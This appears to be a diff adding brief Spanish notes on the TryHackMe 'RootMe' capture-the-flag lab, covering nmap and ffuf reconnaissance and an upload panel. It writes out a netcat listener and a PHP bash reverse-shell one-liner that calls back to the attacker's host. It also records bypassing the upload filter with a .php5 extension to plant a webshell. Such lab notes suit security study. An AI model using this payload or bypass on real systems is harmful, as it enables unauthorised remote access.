@@ -1,0 +1,11 @@
+# RootMe
+- THM
+- 10.128.166.119
+- nmap -sCV -Pn 10.128.166.119 -> 22ssh y 80 http (:
+- whatweb nada interesante
+- ffuf -u http://10.128.166.119/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
+- /panel/ -> File to upload (File Inclusion) 301 y uploads 301 -> sera donde subimos archivos. Un file inclusion de manual.
+- nc -lvnp 4545
+- echo "<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.173.148/4545 0>&1'"); ?>" > file.php ->  PHP não é permitido!
+- probamos a modificar extension -> mv file.php file.php5-> me deja :)
+- /usr/share/webshells/php/php-reverse-shell.php -> pillamos la shell modificamos y cambiamos a .php5
